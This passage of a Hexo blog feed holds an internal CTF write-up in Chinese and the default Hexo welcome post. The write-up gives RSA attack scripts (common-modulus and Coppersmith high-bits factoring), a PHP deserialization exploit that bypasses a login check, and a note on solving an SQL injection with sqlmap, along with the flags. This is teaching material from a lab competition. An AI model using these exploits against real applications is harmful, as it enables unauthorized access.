class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">return</span> x % m</span><br><span class="line">c2=33779700221348135863883889808859563343423001889653007646555069516716259945612034733082561959883961917662442280291944562628883748407830474721742306313000702967971453373637827273515616724662511317244698194870689547692454885460872111009447484052870214525773772949797440252321711833250575503307765208772617173270</span><br><span class="line">n2=96644761669624481301917738904558511784349689869284077227291095697383603370416696531038428870514904299839725620796103329082259883963293954990250648331621341612726931174557257677636896537544958896292649989756895190445785876393803989356576607112504335129072639030916034557841042095819625963688752801565503231051</span><br><span class="line">e2=0x101</span><br><span class="line">c3=30751047399313667982517938591543296360089165396123556639822192850466091408760212776242161290545404062143092058831777133453019026398775795321668225155960973377187125716966663728065553458641296126185722656640906185814271035328849549938786034165849397581790764362592273425592482065323159559623654210395502163654</span><br><span class="line">e3=0x10001</span><br><span class="line">s = egcd(e2, e3)</span><br><span class="line">s1 = s[1]</span><br><span class="line">s2 = s[2]</span><br><span class="line"><span class="keyword">if</span> s1&lt;0:</span><br><span class="line">   s1 = - s1</span><br><span class="line">   c2 = modinv(c2, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;0:</span><br><span class="line">   s2 = - s2</span><br><span class="line">   c3 = modinv(c3, n2)</span><br><span class="line">msg2=(pow(c2,s1,n2)*pow(c3,s2,n2)) % n2</span><br><span class="line"><span class="built_in">print</span> (binascii.unhexlify(hex(msg2)[2:].strip(<span class="string">&quot;L&quot;</span>)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span><span class="string">&#x27;Tanabata Festival, also known as Qiqiao Festival, &#x27;</span></span><br><span class="line"><span class="variable">$b</span><span class="string">&quot;Qijie Festival, daughter&#x27;s day, Qiqiao Festival, Qiniang society, Tanabata Festival, &quot;</span></span><br></pre></td></tr></table></figure><p>第三个加密给出了P的高位，选择Factoring with high bits known攻击<br>附上脚本，在<a href="https://sagecell.sagemath.org/">sage</a>里运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = 0xd6a35446aa682606213555b20b25ec4c1c7ab3347fa20de2cc26b0fcc10e7a48057e4fcb095e1eac71b4b16a6b021a9e656fef70000000000000000000000000</span><br><span class="line">n = 0x72143b40dc0dc54bc0fd389680d49bfbec8ca9e81b872a700a7652e56b94533047f178d5e3bb7ccf1f8ebddf79f2a962f631da9a3adde261cb3c7094db9594d21898e9aa7fcd7e0d7713096b26c7d777600dd4ab0f97ff45e1883f4fc85e36895a2a7900e304142948a1a66963f952d073d40f267fd0f765d5b5f79e3e693787</span><br><span class="line">kbits = 100  //低位个数</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p</span><br><span class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x: %s&quot;</span> %hex(int(x0)))</span><br><span class="line">p = p+x0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>, hex(int(p)))</span><br><span class="line">assert n % p == 0</span><br><span class="line">q = n/int(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q: &quot;</span>, hex(int(q)))</span><br></pre></td></tr></table></figure><p>此前将p转换位2进制之后补齐0至512位，然后将p 和n 转换位16进制，不然不晓得为什么跑不出来</p><p>得出p,q的16进制：<br>p:  0xd6a35446aa682606213555b20b25ec4c1c7ab3347fa20de2cc26b0fcc10e7a48057e4fcb095e1eac71b4b16a6b021a9e656fef792d8e98e64668c994d586dcbf<br>q:  0x88100ea38af4c4ffc88b9c1571a53aa8df2dc9806fbd22fa97ac2d46e038481e0d5d7fdb8135b2c37602ab072c4cf5f34667a6f394b4bc90f0629b4906e52f39</p><p>此时p , q , e , c 都是已知，所以直接用msg1的解法基础rsa解密得出msg3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$msg3</span>=cow and bull woman\<span class="string">&#x27;s day, Qixi, etc., is a traditional festival among Chinese people.</span></span><br></pre></td></tr></table></figure><p>最终解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">answer=<span class="string">&#x27;Tanabata Festival, also known as Qiqiao Festival, Qijie Festival, daughter\&#x27;</span>s day, Qiqiao Festival, Qiniang society, Tanabata Festival, cow and bull woman\<span class="string">&#x27;s day, Qixi, etc., is a traditional festival among Chinese people.&#x27;</span></span><br><span class="line">m=hashlib.sha256()</span><br><span class="line">m.update(answer.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">answer1=m.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(answer1)</span><br></pre></td></tr></table></figure><p>answer1=0a81674cf3d4a570d2128284e422e56da2e38838b43161e36128cc5899440bc2</p><p>最终   flag{0a81674cf3d4a570d2128284e422e56da2e38838b43161e36128cc5899440bc2}</p><h2 id="2-easyphp"><a href="#2-easyphp" class="headerlink" title="2.easyphp"></a>2.easyphp</h2><p>题目源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class YunBao&#123;</span><br><span class="line">    public <span class="variable">$admin</span>;</span><br><span class="line">    public <span class="variable">$password</span>;</span><br><span class="line"> </span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$a</span>,<span class="variable">$p</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;admin=<span class="variable">$a</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">login</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;admin===<span class="variable">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$YunBao</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;YunBao&#x27;</span>]);</span><br><span class="line"><span class="variable">$YunBao</span>-&gt;admin=md5(mt_rand());</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$YunBao</span>-&gt;login())&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>这里直接引用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class YunBao</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$admin</span> = 1;</span><br><span class="line">    public <span class="variable">$password</span> = <span class="string">&#x27;$this -&gt;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=new YunBao();</span><br><span class="line"><span class="variable">$a</span>-&gt;password=&amp;<span class="variable">$a</span>-&gt;admin;</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-云警sql王"><a href="#3-云警sql王" class="headerlink" title="3.云警sql王"></a>3.云警sql王</h2><p>该题是使用Sqlmap配合bp一把梭<br>flag在fl44444g表里面的flag列里面</p><p><img src="/images/yunbao.png" alt="Alt text"></p><p>不晓得为什么爆出来是frag{ybb_sqlyyds_666}<br>把frag改位flag成功提交</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;内部赛&lt;/p&gt;</summary>
    
    
    
    <category term="比赛" scheme="http://example.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/05/20/hello-world/"/>
    <id>http://example.com/2021/05/20/hello-world/</id>
    <published>2021-05-20T10:58:05.399Z</published>
    <updated>2021-05-23T12:26:12.992Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
